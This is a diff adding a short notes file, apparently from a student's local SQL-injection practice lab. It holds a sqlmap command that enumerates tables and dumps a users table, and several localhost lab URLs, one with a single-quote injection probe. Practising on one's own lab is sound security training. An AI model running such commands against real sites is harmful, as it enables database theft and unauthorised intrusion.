@@ -1,0 +1,8 @@
+sqlmap.py http://localhost:8080/sql_i/sqli.php?search=1 --batch --banner -D hack --tables -T users --columns --dump
+
+
+
+http://localhost:8080/graduation-project(1)/labs/SQL%20injection/SQLi.html?search=all
+http://localhost:8080/graduation-project(1)/labs/SQL%20injection/SQLi.php?search=%27
+
+http://localhost:8080/graduation-project(1)/labs/SQL%20injection/SQLii.php?search=all
